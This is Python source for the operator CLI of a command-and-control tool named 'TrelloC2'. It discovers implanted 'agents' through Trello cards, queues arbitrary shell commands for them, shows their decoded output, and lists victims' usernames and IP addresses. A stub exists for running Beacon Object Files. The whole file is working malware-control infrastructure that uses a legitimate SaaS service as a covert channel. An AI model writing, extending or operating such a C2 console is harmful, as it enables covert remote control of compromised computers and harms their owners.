import random
import time
from libs.trello_api import *
from rich.table import Table
from rich.console import Console
from libs.data_format import *
from libs.db_utils import *



class CliClient:
    def __init__(self,password:str,trello_api_key:str,trello_token:str,trello_dashboard:str,worker,sleep_time:int=30):
        self.password = password
        self.trello_api = TrelloAPI(trello_api_key,trello_token,trello_dashboard)
        self.sleep_time = sleep_time
        self.server_refresh_rate = 10
        self.db_connector = SqliteConnector("./database/database.db")
        self.worker = worker

    
    def dispatch_func(self,function_name:str,data:dict):

        def execute_cmd(data):
            if len(data)<2:
                print("[-] Not Enough arguments")
                return False
            targeted_agent = data.pop(0)
            task_id = generate_id(targeted_agent)
            #encrypted_command = format_command_to_send(" ".join(data),task_id,self.randomize_jitter(),self.password,"implented")
            #if self.trello_api.post_comment_on_card(targeted_agent,encrypted_command):
            if self.db_connector.append_task(task_id,targeted_agent," ".join(data)):
                print(f"[+] Queueing \"{' '.join(data)}\" on \"{targeted_agent}\"")
            else:
                print(f"[-] Failed to execute \"{' '.join(data)}\" on \"{targeted_agent}\"")
            return True

        def runbof(data):
            print("Not implemented yet")


        def get_agents(data):
            all_agents = self.db_connector.get_agents()
            table = Table()
            for column in ["Agent ID","Agent Name","Username","IP Addr","Sleep","Stage"]:
                table.add_column(column)
            for row in [[str(i) for i in line] for line in all_agents]:
                table.add_row(*row, style='bright_green')
            console = Console()
            console.print(table)



        def get_output(data):
            if len(data)==0:
                print("[-] Not Enough arguments")
                return False
            targeted_id = data[0]
            all_tasks = self.db_connector.get_tasks_for_agent(targeted_id)
            clean_tasks = []
            for task in all_tasks:
                new_task = []
                for index,part in enumerate(task[:6]):
                    if index==2 or index==3:
                        if part=="":
                            new_task.append("")
                        else:
                            decoded = base64.b64decode(part.encode()).decode()
                            if len(all_tasks)==1 or len(decoded)<=19:
                                new_task.append(decoded)
                            elif len(decoded)>19:
                                new_task.append(decoded[:19]+"...")
                            else:
                                new_task.append(decoded)
                    elif len(all_tasks)==1:
                        new_task.append(str(part))
                    elif len(str(part))>19:
                        new_task.append(str(part)[:19]+"...")
                    else:
                        new_task.append(str(part))
                clean_tasks.append(new_task)
                new_task = []

                        
            table = Table()
            for column in ["Task ID","Agent ID","Command","Output","Status","Time Created"]:
                table.add_column(column)
            for row in clean_tasks:
                table.add_row(*row, style='bright_green')
            console = Console()
            console.print(table)
            


        def help(data):
            table = Table()
            rows = [
                ["exec", "Execute a command on an agent", "exec <agent_id> <commandline>"],
                ["agents", "Get a list of agents", "agents"],
                ["get", "Get the output of a command", "get <output_id or agent_id>"],
                ["check", "Loop to check if a new agent appears", "check"],
                ["help", "Display this message", "help"],
                ["runbof","Run a BOF on the target","runbof <agent_id> <bof fullpath (.o)>"]
            ]
            columns = ["Command", "Description", "Usage"]

            for column in columns:
                table.add_column(column)

            for row in rows:
                table.add_row(*row, style='bright_green')

            console = Console()
            console.print(table)

        def checkin(data):
            print("[+] Looping to get all active agents and update the list (CTRL+C to stop discovery)")
            while True:
                try:
                    print("[~] Checking for a new agent, next attempt in 10sec")
                    all_agent_cards = self.trello_api.get_cards_by_name_contains("tache-")
                    for agent in all_agent_cards:
                        print(f"[+] Found an agent with name: {agent["name"].replace("tache-","")} and ID: {agent["shortLink"]}")
                        if self.db_connector.append_agent(agent["shortLink"],agent["name"].replace("tache-",""),"","",self.sleep_time,"initial"):
                            task_id = generate_id(agent["name"].replace("tache-",""))
                            if self.db_connector.append_task(task_id,agent["shortLink"],"checkin"):
                                print(f"[+] Queueing \"checkin\" on \"{agent["shortLink"]}\"")
                            else:
                                print(f"[-] Failed to execute \"checkin\" on \"{agent["shortLink"]}\"")


                    time.sleep(20)
                    pass
                except KeyboardInterrupt:
                    print("[+] Stopping discovery")
                    break

        dispatch = {
            "exec":execute_cmd,
            "agents":get_agents,
            "get":get_output,
            "check":checkin,
            "help":help,
            "runbof":runbof
        }
        if data!="check":
            return dispatch[function_name](data)
        elif data=="check":
            return function_name in dispatch.keys()
        else:
            return False

    def init_cli_client(self,):
        while True:
            try:
                command = input('\033[92m'+"[TrelloC2]> "+ '\033[0m')
            except KeyboardInterrupt:
                if input("\n[~] Do you really want to exit ? (y/n) :").lower()=="y":
                    print('\033[91m'+"\n[CTRL+C] Exiting !"+ '\033[0m')
                    self.worker.active = False
                    break
                else:
                    command=""
                    pass
            if command in ["break","quit","exit"]:
                if input("[~] Do you really want to exit ? (y/n) :").lower()=="y":
                    print('\033[91m'+f"[{command}] Exiting !"+ '\033[0m')
                    self.worker.active = False
                    break
                else:
                    pass
            elif command.strip()=="":
                pass
            elif self.dispatch_func(command.split()[0],"check"):
                if len(command.split()[0])==1:
                    self.dispatch_func(command.split()[0],{})
                else:
                    self.dispatch_func(command.split()[0],command.split()[1:])
            else:
                print("[-] Not a valid command, try help")
